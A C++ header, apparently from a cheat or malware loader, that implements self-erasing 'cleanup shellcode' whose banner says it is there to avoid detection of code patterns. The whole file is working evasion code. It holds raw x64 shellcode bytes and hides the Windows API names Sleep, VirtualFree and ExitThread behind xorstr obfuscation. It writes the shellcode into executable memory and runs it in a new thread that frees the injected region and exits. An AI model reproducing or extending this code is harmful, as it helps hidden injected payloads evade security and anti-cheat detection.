#pragma once
#include <Windows.h>
#include <XorStr.hpp>

// ============================================================================
// CLEANUP SHELLCODE - EVITA DETECÇÃO DE CODE PATTERNS
// ============================================================================

namespace CleanupShellcode {

#pragma pack(push, 1)
    struct CLEANUP_PARAMS {
        void* pSleep;               // 0x00
        void* pVirtualFree;         // 0x08
        void* pExitThread;          // 0x10
        void* pRegionToFree;        // 0x18
        SIZE_T regionSize;          // 0x20
        DWORD sleepTimeMs;          // 0x28
        DWORD padding;              // 0x2C
    };
#pragma pack(pop)

    inline unsigned char g_CleanupShellcode[] = {
        0x48, 0x8D, 0x64, 0x24, 0xC8,
        0x48, 0x89, 0x4C, 0x24, 0x30,
        0x8B, 0x49, 0x28,
        0x48, 0x8B, 0x44, 0x24, 0x30,
        0xFF, 0x10,
        0x48, 0x8B, 0x44, 0x24, 0x30,
        0x48, 0x8B, 0x48, 0x18,
        0x33, 0xD2,
        0x41, 0xB8, 0x00, 0x80, 0x00, 0x00,
        0xFF, 0x50, 0x08,
        0x48, 0x8B, 0x44, 0x24, 0x30,
        0x33, 0xC9,
        0xFF, 0x50, 0x10,
        0xCC, 0xCC, 0xCC, 0xCC,
        0x00, 0x00, 0x00, 0x00,
    };

    constexpr SIZE_T CLEANUP_TOTAL_SIZE = 0x1000;
    constexpr SIZE_T PARAMS_OFFSET = 0x400;
    constexpr SIZE_T CODE_OFFSET = 0x500;

    inline CLEANUP_PARAMS g_CleanupParams = { 0 };
    inline void* g_pCleanupShellcodeAddr = nullptr;
    inline bool g_CleanupInitialized = false;

    inline void Initialize(void* pAllocationBase, SIZE_T totalSize, void* pCleanupAddr, DWORD sleepMs = 3000) {
        if (!pAllocationBase || !totalSize || !pCleanupAddr) return;

        HMODULE hKernel32 = xorstr("kernel32.dll").use([](const char* s) {
            return GetModuleHandleA(s);
            });
        if (!hKernel32) return;

        g_CleanupParams.pSleep = xorstr("Sleep").use([&](const char* s) -> void* {
            return (void*)GetProcAddress(hKernel32, s);
            });
        g_CleanupParams.pVirtualFree = xorstr("VirtualFree").use([&](const char* s) -> void* {
            return (void*)GetProcAddress(hKernel32, s);
            });
        g_CleanupParams.pExitThread = xorstr("ExitThread").use([&](const char* s) -> void* {
            return (void*)GetProcAddress(hKernel32, s);
            });
        g_CleanupParams.pRegionToFree = pAllocationBase;
        g_CleanupParams.regionSize = totalSize;
        g_CleanupParams.sleepTimeMs = sleepMs;

        g_pCleanupShellcodeAddr = pCleanupAddr;
        g_CleanupInitialized = (g_CleanupParams.pSleep &&
            g_CleanupParams.pVirtualFree &&
            g_CleanupParams.pExitThread);
    }

    inline bool IsAvailable() {
        return g_CleanupInitialized;
    }

    inline bool PrepareShellcode() {
        if (!g_CleanupInitialized || !g_pCleanupShellcodeAddr) return false;

        BYTE* pBase = (BYTE*)g_pCleanupShellcodeAddr;

        DWORD oldProtect;
        if (!VirtualProtect(g_pCleanupShellcodeAddr, CLEANUP_TOTAL_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            return false;
        }

        memcpy(pBase + PARAMS_OFFSET, &g_CleanupParams, sizeof(CLEANUP_PARAMS));
        memcpy(pBase + CODE_OFFSET, g_CleanupShellcode, sizeof(g_CleanupShellcode));

        VirtualProtect(g_pCleanupShellcodeAddr, CLEANUP_TOTAL_SIZE, PAGE_EXECUTE_READ, &oldProtect);

        return true;
    }

    inline bool ExecuteCleanup() {
        if (!g_CleanupInitialized) return false;
        if (!PrepareShellcode()) return false;

        BYTE* pBase = (BYTE*)g_pCleanupShellcodeAddr;
        void* pParams = pBase + PARAMS_OFFSET;
        void* pCode = pBase + CODE_OFFSET;

        HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)pCode, pParams, 0, nullptr);
        if (!hThread) return false;

        CloseHandle(hThread);
        return true;
    }

} // namespace CleanupShellcode